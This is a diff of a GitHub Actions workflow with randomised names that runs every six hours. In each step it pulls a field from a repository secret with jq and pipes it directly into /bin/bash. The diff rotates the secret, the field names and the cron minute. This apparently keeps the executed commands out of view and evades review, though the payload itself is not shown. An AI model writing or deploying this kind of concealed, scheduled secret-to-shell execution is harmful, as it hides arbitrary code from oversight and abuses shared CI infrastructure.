@@ -3,8 +3,7 @@ name: renquanniu3481
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 1/6 * * *'
-
+    - cron: '21 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: renquanniu3481
         env:
-          l1250: ${{ secrets.l1250 }}
+          ytpm3: ${{ secrets.ytpm3 }}
         run: |
-          echo $l1250 | jq -r .n47 | /bin/bash
-          echo $eefy057 | jq -r .cqko3 | /bin/bash
-          echo $maf52742 | jq -r .ledb624 | /bin/bash
-          echo $qs489 | jq -r .afg918 | /bin/bash
-          echo $a65082 | jq -r .slj06742 | /bin/bash
-          echo $ksld8 | jq -r .y7561 | /bin/bash
-          echo $iiowj2 | jq -r .ps5 | /bin/bash
-          echo $dd5623 | jq -r .cwmfr4927 | /bin/bash
+          echo $ytpm3 | jq -r .snmll31 | /bin/bash
+          echo $b0280 | jq -r .area6304 | /bin/bash
+          echo $esrka533 | jq -r .ry2706 | /bin/bash
+          echo $ef9 | jq -r .satx40766 | /bin/bash
+          echo $cfiky9597 | jq -r .tomtp584 | /bin/bash
+          echo $y7365 | jq -r .mjjh6 | /bin/bash
+          echo $phaan1 | jq -r .bhnfq3 | /bin/bash
+          echo $zoh9462 | jq -r .cvo06 | /bin/bash
 
